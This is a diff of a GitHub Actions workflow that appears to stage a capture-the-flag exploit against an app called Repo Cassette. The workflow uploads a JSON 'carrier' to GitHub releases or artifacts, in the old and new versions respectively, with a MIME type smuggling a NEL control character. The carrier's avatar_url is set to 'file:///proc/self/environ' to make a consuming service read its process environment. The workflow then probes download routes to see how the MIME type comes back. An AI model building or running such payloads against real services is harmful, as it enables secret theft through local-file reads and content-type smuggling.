@@ -1,4 +1,4 @@
-name: Repo Cassette release MIME probe
+name: Repo Cassette artifact blob MIME fallback probe
 
 on:
   push:
@@ -6,156 +6,90 @@ on:
       - codex/repo-cassette-release-routes
 
 permissions:
-  contents: write
+  actions: read
+  contents: read
 
 jobs:
-  release-mime-probe:
+  artifact-blob-mime-probe:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Briefly publish, inspect, and remove a release asset
+      - name: Prepare repository-shaped JSON
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json
+          payload = {
+              "full_name": "pending/pending",
+              "owner": {"login": "cassette", "avatar_url": "file:///proc/self/environ"},
+              "description": "Repo Cassette artifact MIME fallback probe",
+              "stargazers_count": 0,
+          }
+          with open("carrier.json", "wb") as stream:
+              stream.write(json.dumps(payload, separators=(",", ":")).encode())
+          PY
+      - name: Upload raw artifact without MIME metadata
+        id: carrier
+        uses: ./.github/actions/raw-artifact
+        with:
+          path: carrier.json
+          blob_mime_type: "application/json\u0085"
+      - name: Inspect the artifact API response
         uses: actions/github-script@v7
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ARTIFACT_ID: ${{ steps.carrier.outputs.artifact-id }}
         with:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           script: |
             const https = require('https');
             const {createHash} = require('crypto');
-            const owner = context.repo.owner;
-            const repo = context.repo.repo;
-            const tag = 'ctf-repo-cassette-probe-' + context.runId + '-' + context.runAttempt;
-            let releaseId = null;
-            let tagCreated = false;
-
-            function request(url, method = 'GET', headers = {}, body = null) {
+            const id = process.env.ARTIFACT_ID;
+            const url = 'https://api.github.com/repos/' + context.repo.owner + '/' +
+              context.repo.repo + '/actions/artifacts/' + id + '/zip';
+            function request(target, headers) {
               return new Promise((resolve, reject) => {
-                const req = https.request(url, {method, headers}, res => {
+                https.get(target, {headers}, response => {
                   const chunks = [];
-                  res.on('data', chunk => chunks.push(chunk));
-                  res.on('end', () => resolve({
-                    status: res.statusCode || 0,
-                    headers: res.headers,
+                  response.on('data', chunk => chunks.push(chunk));
+                  response.on('end', () => resolve({
+                    status: response.statusCode || 0,
+                    headers: response.headers,
                     body: Buffer.concat(chunks),
                   }));
-                });
-                req.on('error', reject);
-                if (body) req.write(body);
-                req.end();
+                }).on('error', reject);
               });
             }
-
-            async function follow(url, accept) {
-              let current = new URL(url);
-              for (let hop = 0; hop < 6; hop++) {
-                const headers = {accept, 'user-agent': 'repo-cassette-probe', 'x-github-api-version': '2022-11-28'};
-                if (current.hostname === 'api.github.com') headers.authorization = 'Bearer ' + process.env.GITHUB_TOKEN;
-                const response = await request(current, 'GET', headers);
-                const location = response.headers.location;
-                if (response.status >= 300 && response.status < 400 && location) {
-                  current = new URL(location, current);
-                  continue;
-                }
-                return {response, host: current.host};
+            let current = new URL(url);
+            let response;
+            for (let hop = 0; hop < 6; hop++) {
+              const headers = {
+                accept: 'application/vnd.github.v3+json',
+                'user-agent': 'repo-cassette-probe',
+                'x-github-api-version': '2022-11-28',
+              };
+              if (current.hostname === 'api.github.com') {
+                headers.authorization = 'Bearer ' + process.env.GITHUB_TOKEN;
               }
-              throw new Error('redirect limit exceeded');
+              response = await request(current, headers);
+              if (response.status >= 300 && response.status < 400 && response.headers.location) {
+                current = new URL(response.headers.location, current);
+                continue;
+              }
+              break;
             }
-
-            async function inspectAsset(asset) {
-              console.log('ASSET_REPORTED_CONTENT_TYPE=' + JSON.stringify(asset.content_type));
-              const candidateUrls = [
-                'https://api.github.com/repos/' + owner + '/' + repo + '/releases/download/' + tag + '/' + asset.name,
-                'https://api.github.com/repos/' + owner + '/' + repo + '/releases/assets/' + asset.id + '/download',
-                'https://api.github.com/repos/' + owner + '/' + repo + '/releases/assets/' + asset.id + '?download=1',
-                'https://api.github.com/repos/' + owner + '/' + repo + '/releases/assets/' + asset.id + '?raw=1',
-                'https://api.github.com/repos/' + owner + '/' + repo + '/downloads/assets/' + asset.id,
-              ];
-              for (const candidate of candidateUrls) {
-                const {response, host} = await follow(candidate, 'application/vnd.github.v3+json');
-                console.log('CANDIDATE_ROUTE status=' + response.status +
-                  ' host=' + host +
-                  ' content_type=' + JSON.stringify(response.headers['content-type'] || '') +
-                  ' bytes=' + response.body.length +
-                  ' sha256=' + createHash('sha256').update(response.body).digest('hex') +
-                  ' prefix_hex=' + response.body.subarray(0, 24).toString('hex'));
-              }
-              console.log('ASSET_SIZE=' + asset.size);
-              for (const accept of [
-                'application/vnd.github.v3+json',
-                'application/vnd.github.raw+json',
-                'application/vnd.github.v3.raw+json',
-                'application/octet-stream',
-              ]) {
-                const {response, host} = await follow(asset.url, accept);
-                console.log('ASSET_GET accept=' + accept +
-                  ' status=' + response.status +
-                  ' host=' + host +
-                  ' content_type=' + JSON.stringify(response.headers['content-type'] || '') +
-                  ' bytes=' + response.body.length +
-                  ' sha256=' + createHash('sha256').update(response.body).digest('hex') +
-                  ' prefix_hex=' + response.body.subarray(0, 24).toString('hex'));
-              }
-              const direct = await follow(asset.browser_download_url, 'application/json');
-              console.log('ASSET_BROWSER_DOWNLOAD status=' + direct.response.status +
-                ' host=' + direct.host +
-                ' content_type=' + JSON.stringify(direct.response.headers['content-type'] || '') +
-                ' bytes=' + direct.response.body.length +
-                ' sha256=' + createHash('sha256').update(direct.response.body).digest('hex'));
-            }
-
+            const type = response.headers['content-type'] || '';
+            console.log('ARTIFACT_ID=' + id);
+            console.log('ARTIFACT_RESPONSE_STATUS=' + response.status);
+            console.log('ARTIFACT_RESPONSE_HOST=' + current.host);
+            console.log('ARTIFACT_RESPONSE_CONTENT_TYPE=' + JSON.stringify(type));
+            console.log('ARTIFACT_RESPONSE_BYTES=' + response.body.length);
+            console.log('ARTIFACT_RESPONSE_SHA256=' + createHash('sha256').update(response.body).digest('hex'));
+            console.log('ARTIFACT_RESPONSE_PREFIX_HEX=' + response.body.subarray(0, 32).toString('hex'));
             try {
-              const created = await github.rest.repos.createRelease({
-                owner, repo, tag_name: tag, target_commitish: context.ref_name,
-                name: 'temporary Repo Cassette probe', body: 'Automatically removed after MIME inspection.',
-                draft: false, prerelease: true,
-              });
-              releaseId = created.data.id;
-              tagCreated = true;
-              const payload = Buffer.from(JSON.stringify({
-                full_name: owner + '/' + repo + '/releases/assets/pending',
-                owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-                description: 'temporary release MIME probe',
-                stargazers_count: 0,
-              }));
-              for (const [label, mime] of [
-                ['valid', 'application/json'],
-                ['NEL', 'application/json' + String.fromCharCode(0x85)],
-              ]) {
-                try {
-                  const upload = new URL(created.data.upload_url.split('{')[0] + '?name=' + label + '-carrier.json');
-                  const result = await request(upload, 'POST', {
-                    authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
-                    accept: 'application/vnd.github+json',
-                    'x-github-api-version': '2022-11-28',
-                    'content-type': mime,
-                    'content-length': String(payload.length),
-                  }, payload);
-                  console.log('ASSET_UPLOAD label=' + label + ' status=' + result.status);
-                  if (result.status >= 200 && result.status < 300) {
-                    await inspectAsset(JSON.parse(result.body.toString('utf8')));
-                  } else {
-                    console.log('ASSET_UPLOAD_ERROR label=' + label +
-                      ' message=' + result.body.toString('utf8').slice(0, 240).replace(/[\\r\\n]+/g, ' '));
-                  }
-                } catch (error) {
-                  console.log('ASSET_PROBE_ERROR label=' + label + ' code=' + (error.code || 'unknown'));
-                }
-              }
-            } finally {
-              if (releaseId !== null) {
-                try {
-                  await github.rest.repos.deleteRelease({owner, repo, release_id: releaseId});
-                  console.log('TEMP_RELEASE_DELETED=true');
-                } catch (error) {
-                  console.log('TEMP_RELEASE_DELETE_FAILED=' + error.status);
-                }
-              }
-              if (tagCreated) {
-                try {
-                  await github.rest.git.deleteRef({owner, repo, ref: 'tags/' + tag});
-                  console.log('TEMP_TAG_DELETED=true');
-                } catch (error) {
-                  console.log('TEMP_TAG_DELETE_FAILED=' + error.status);
-                }
-              }
+              const body = JSON.parse(response.body.toString('utf8'));
+              console.log('ARTIFACT_RESPONSE_FULL_NAME=' + JSON.stringify(body.full_name));
+              console.log('ARTIFACT_RESPONSE_AVATAR=' + JSON.stringify(body.owner?.avatar_url));
+            } catch {
+              console.log('ARTIFACT_RESPONSE_JSON=false');
             }
